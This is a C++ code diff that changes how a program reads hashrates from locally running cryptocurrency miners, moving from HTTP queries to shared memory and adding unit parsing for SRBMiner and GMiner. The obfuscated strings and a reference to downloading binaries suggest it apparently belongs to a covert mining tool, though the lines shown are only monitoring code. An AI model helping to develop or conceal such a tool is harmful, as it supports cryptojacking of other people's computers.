@@ -131,62 +131,48 @@ std::string fetchJsonFromUrl(const std::wstring& url, int useSSL) {
 }
 
 double GetMinerHashrate() {
-    std::string urlStr = OBFUSCATE_STRING("http://127.0.0.1:8888/2/summary");
-    std::wstring url(urlStr.begin(), urlStr.end());
-    std::string response = fetchJsonFromUrl(url);
-    
-    if (response.empty()) {
-        std::cerr << "Failed to fetch miner summary." << std::endl;
+    HANDLE hMap = OpenFileMappingA(FILE_MAP_READ, FALSE, "Local\\Hashrate");
+    if (!hMap) {
         return 0.0;
     }
-
-    try {
-        auto jsonObj = nlohmann::json::parse(response);
-        
-        if (jsonObj.contains("hashrate") && jsonObj["hashrate"].contains("total")) {
-            auto total = jsonObj["hashrate"]["total"];
-            if (total.is_array() && total.size() > 0) {
-                auto first = total[0];
-                if (!first.is_null()) {
-                    return first.get< double >();
-                }
-            }
-        }
-    } catch (const std::exception& e) {
-        std::cerr << "Error parsing miner summary: " << e.what() << std::endl;
+    const auto *ptr = static_cast<const double *>(MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, sizeof(double)));
+    double hashrate = 0.0;
+    if (ptr) {
+        hashrate = *ptr;
+        UnmapViewOfFile(ptr);
     }
-
-    return 0.0;
+    CloseHandle(hMap);
+    return hashrate;
 }
 
-// Get GPU miner (GMiner) hashrate from API endpoint
-double GetGPUMinerHashrate() {
-    std::string response = fetchJsonFromUrl(L"http://127.0.0.1:50010/stat");
-    
+// Get GPU miner (SRBMiner-MULTI) hashrate and unit from API endpoint
+std::pair<double, std::string> GetGPUMinerHashrate() {
+    std::string response = fetchJsonFromUrl(L"http://127.0.0.1:21550/stat");
+
     if (response.empty()) {
-        std::cerr << "[-] Failed to fetch GMiner stats." << std::endl;
-        return 0.0;
+        return {0.0, "H/s"};
     }
 
     try {
         auto jsonObj = nlohmann::json::parse(response);
-        
-        // Extract pool_speed from GMiner API response
-        if (jsonObj.contains("pool_speed")) {
-            auto speed = jsonObj["pool_speed"];
-            if (speed.is_number()) {
-                double hashrate = speed.get<double>();
-#ifdef ENABLE_DEBUG_CONSOLE
-                std::cout << "[+] GMiner pool_speed: " << hashrate << " H/s" << std::endl;
-#endif
-                return hashrate;
+
+        // GMiner API (/stat): pool_speed + speed_unit
+        if (jsonObj.contains("pool_speed") && jsonObj["pool_speed"].is_number()) {
+            double hashrate = jsonObj["pool_speed"].get<double>();
+            std::string unit = "H/s";
+            if (jsonObj.contains("speed_unit") && jsonObj["speed_unit"].is_string()) {
+                unit = jsonObj["speed_unit"].get<std::string>();
             }
+#ifdef ENABLE_DEBUG_CONSOLE
+            std::cout << "[+] GMiner pool_speed: " << hashrate << " " << unit << std::endl;
+#endif
+            return {hashrate, unit};
         }
     } catch (const std::exception& e) {
         std::cerr << "[-] Error parsing GMiner stats: " << e.what() << std::endl;
     }
 
-    return 0.0;
+    return {0.0, "H/s"};
 }
 
 // Download binary data from URL
